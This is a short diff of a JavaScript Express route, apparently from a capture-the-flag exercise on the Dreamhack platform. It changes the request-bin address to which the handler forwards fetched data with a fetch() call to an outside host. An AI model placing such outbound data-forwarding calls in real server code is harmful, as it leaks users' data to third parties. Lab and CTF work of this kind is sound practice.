@@ -27,7 +27,7 @@ app.get('/info', (req, res) => {
         })
         .then(response => response.json())
         .then(data => {
-            fetch("https://onspmjs.request.dreamhack.games/"+data.data)
+            fetch("https://hwbusxt.request.dreamhack.games/"+data.data)
             console.log(data.data)
             fetch("http://localhost:4000/log", {
                 method: "POST",
